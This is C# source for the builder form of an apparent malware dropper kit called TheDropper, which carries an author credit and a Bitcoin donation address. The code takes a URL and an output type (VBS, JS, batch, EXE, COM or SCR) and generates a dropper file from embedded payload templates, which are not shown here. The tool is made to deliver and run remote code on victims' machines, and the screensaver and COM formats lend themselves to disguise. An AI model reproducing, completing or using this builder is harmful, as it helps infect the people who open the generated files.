/*
    $ TheDropper $

    Author > github.com/L1ghtM4n
    Donate > 1Lightx1nLy6DfH3W8WD1g4PugRu92M7GV (Bitcoin)
*/

using System;
using System.IO;
using System.Windows.Forms;

using TheDropper.Generators;
using TheDropper.Properties;

namespace TheDropper
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
        }

        // Handle button click
        private void buttonBuild_Click(object sender, EventArgs e)
        {
            string file;
            string url = textBoxUrl.Text;
            string ext = comboBoxExtension.Text;

            // Check url
            if (!url.StartsWith("http"))
            {
                MessageBox.Show(this, "Please enter valid url", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                textBoxUrl.Focus();
                return;
            }
            // Check extension
            if (string.IsNullOrEmpty(ext))
            {
                MessageBox.Show(this, "Please select extension", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                comboBoxExtension.Focus();
                return;
            }

            // Create generators
            ScriptGenerator sg = new ScriptGenerator(url);
            ExecutableGenerator eg = new ExecutableGenerator(url);

            // Handle
            switch (ext)
            {
                case "vbs": {
                        file = sg.Generate(Resources.vbs_payload, "vbs");
                        break;
                    }
                case "js":
                    {
                        file = sg.Generate(Resources.js_payload, "js");
                        break;
                    }
                case "bat":
                    {
                        file = sg.Generate(Resources.batch_payload, "bat");
                        break;
                    }
                case "cmd":
                    {
                        file = sg.Generate(Resources.batch_payload, "cmd");
                        break;
                    }
                case "exe":
                    {
                        file = eg.Generate("exe");
                        break;
                    }
                case "com":
                    {
                        file = eg.Generate("com");
                        break;
                    }
                case "scr":
                    {
                        file = eg.Generate("scr");
                        break;
                    }
                default:
                    {
                        MessageBox.Show(this, "Unknown extension", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        return;
                    }
            }

            // Ok message
            if (File.Exists(file))
            {
                MessageBox.Show(this, "Saved: " + file, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        // Open my github on click
        private void labelAuthor_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/L1ghtM4n");
        }
    }
}
